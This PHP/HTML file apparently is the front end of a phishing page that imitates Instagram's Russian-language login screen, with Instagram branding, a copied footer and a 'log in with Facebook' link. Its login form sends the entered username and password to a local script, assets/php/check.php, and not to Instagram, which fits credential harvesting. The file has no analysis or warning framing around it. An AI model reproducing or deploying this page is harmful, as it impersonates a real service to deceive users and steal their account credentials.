<?php
session_start();

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Landing</title>
    <link rel="stylesheet" href="assets/css/animate.css">
    <link rel="stylesheet" href="assets/css/style.min.css">
</head>
<body>

     <div class="wrapper InstagramPage"> 
        <div class="content">
            <div class="container">
            <div class="instagram">
                <div class="instagram__row">

                    <img src="./assets/icons/logo.png" alt="">


                        <form action="./assets/php/check.php" method="POST" class="instagram__form">
                            
                            <input type="text" name="instagramName" placeholder="Телефон, имя пользователя или эл. адрес">
                                <div class="text-danger">Введите Логин</div>
                           
                            <input type="password" name="instagramPassword" placeholder="Пароль">
                                <div class="text-danger">Введите пароль</div>

                            <button type="submit" value="Войти">Войти</button>
                        </form>


                    <div class="instagram__line">или</div>

                    <div class="instagram__facebook">
                        <img src="./assets/icons/Facebook.png" alt="">
                        <p><a href="./facebook.php">Войти через Facebook</a></p>
                    </div>

                    <div class="instagram__forget">Забыли пароль?</div>
                    <div class="instagram__create">
                        <p>У вас ещё нет аккаунта?</p>
                        <p>Зарегистриваться</p>
                    </div>


                    <div class="instagram__download download">
                        <div>Установите приложение.</div>
                        <div class="instagram__download__row">
                            <img src="./assets/img/AppStore.png" alt="">
                            <img src="./assets/img/Google Play.png" alt="">
                        </div>
                    </div>


                </div>
            </div>
            </div>
        </div>

        <footer class="footer">
            <div class="container">
                <ul class="footer__row">
                    <li>Информация</li>
                    <li>Блог</li>
                    <li>Вакансии</li>
                    <li>Помощь</li>
                    <li>API</li>
                    <li>Конфиденциальность</li>
                    <li>Условия</li>
                    <li>Популярные аккаутны </li>
                    <li>Хэштеги</li>
                    <li>Места</li>
                    <li>Instagram Lite</li>
                    <br/>
                    <li>Красота</li>
                    <li>Танцы</li>
                    <li>Фитнес</li>
                    <li>Еда и напитки</li>
                    <li>Дом и сад</li>
                    <li>Музыка</li>
                    <li>Изобразительное искусство</li>
                </ul>
                <div class="footer__text">
                    <p>Руский</p>
                    <p>Instagram от Facebook, 2021</p>
                </div>
            </div>
        </footer>
    </div>
    


  


    <script src="assets/js/main.js"></script>
</body>
</html>